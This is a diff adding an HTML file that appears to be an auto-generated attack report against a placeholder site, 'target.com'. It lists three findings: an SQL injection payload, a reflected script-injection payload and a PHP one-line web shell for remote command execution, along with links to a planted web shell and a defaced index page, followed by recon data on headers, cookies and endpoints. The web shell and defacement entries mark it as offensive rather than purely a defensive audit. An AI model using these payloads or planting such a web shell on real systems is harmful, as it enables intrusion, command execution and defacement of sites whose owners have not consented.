@@ -1,0 +1,24 @@
+<html>
+<head><title>POC - target.com</title></head>
+<body>
+<h1>Vulnerability Report</h1>
+<p>Target: http://target.com</p>
+<p>Total Vuln: 3</p>
+<ul>
+<li><b>SQLi</b> - http://target.com?id=1' OR '1'='1<br>Payload: ' OR '1'='1<br>Evidence: SQL error</li>
+<li><b>XSS</b> - http://target.com?q=<script>alert(1)</script><br>Payload: <script>alert(1)</script><br>Evidence: Reflected</li>
+<li><b>RCE</b> - http://target.com?cmd=id<br>Payload: <?php system($_GET['cmd']); ?><br>Evidence: Command output</li>
+</ul>
+<p>Webshell: http://target.com/shell.php</p>
+<p>Deface: http://target.com/index.html</p>
+<h2>Deep Analysis</h2>
+<pre>{
+  "headers": {"Server": "Apache/2.4.54"},
+  "cookies": {"PHPSESSID": "abc123"},
+  "forms": 2,
+  "ajax": ["/api/getdata"],
+  "api_endpoints": ["/api/v1/users"],
+  "parameters": ["id", "q", "cmd"]
+}</pre>
+</body>
+</html>
